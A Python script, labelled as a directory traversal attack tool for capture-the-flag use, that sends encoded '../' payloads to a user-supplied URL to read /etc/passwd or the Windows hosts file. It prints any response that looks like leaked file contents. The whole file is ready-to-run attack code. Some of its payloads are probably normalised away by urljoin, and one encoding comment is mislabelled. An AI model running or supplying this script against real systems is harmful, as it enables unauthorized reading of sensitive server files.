#!/usr/bin/env python3

import requests
import urllib.parse
import argparse

# ANSI color codes
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# Payloads for Linux and Windows directory traversal targeting specific files
payloads = {
    "linux": [
        "../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",  # URL-encoded
        "../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # Double URL-encoded
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Mixed encoding
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Encoding bypass
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"  # Double percent-encoded
    ],
    "windows": [
        "../../../../../../windows/system32/drivers/etc/hosts",
        "..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
        "../../windows/system32/drivers/etc/hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
        "%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts",
        "..%c0%af..%c0%af..%c0%af..%c0%afwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts"
    ]
}

# Headers for requests (useful if needing user-agent or other specific headers)
headers = {
    "User-Agent": "Mozilla/5.0"
}

# Function to test traversal payloads
def directory_traversal(url, payloads):
    for payload in payloads:
        traversal_url = urllib.parse.urljoin(url, payload)
        print(f"{bcolors.OKBLUE}Testing payload: {payload}{bcolors.ENDC}")
        try:
            response = requests.get(traversal_url, headers=headers, timeout=5)
            
            # Check if successful traversal by content or status
            if response.status_code == 200 and ("root:" in response.text or "Microsoft" in response.text):
                print(f"{bcolors.OKGREEN}Possible directory traversal found with payload: {payload}{bcolors.ENDC}")
                print(response.text[:500])  # Displaying first 500 characters of the response
            else:
                print(f"{bcolors.WARNING}Payload failed or no sensitive data found with payload: {payload}{bcolors.ENDC}")
                
        except requests.exceptions.RequestException as e:
            print(f"{bcolors.FAIL}Request failed for payload {payload}: {e}{bcolors.ENDC}")

# Main function with argument parsing
def main():
    parser = argparse.ArgumentParser(description="Directory Traversal Attack Script for CTFs")
    parser.add_argument("--url", required=True, help="Target website URL")
    parser.add_argument("--os", choices=["linux", "windows"], required=True, help="Target OS type for payloads (linux or windows)")
    args = parser.parse_args()
    
    # Select payloads based on OS type
    os_payloads = payloads[args.os]
    
    # Run the traversal function with the user-provided URL and OS-specific payloads
    directory_traversal(args.url, os_payloads)

# Entry point
if __name__ == "__main__":
    main()
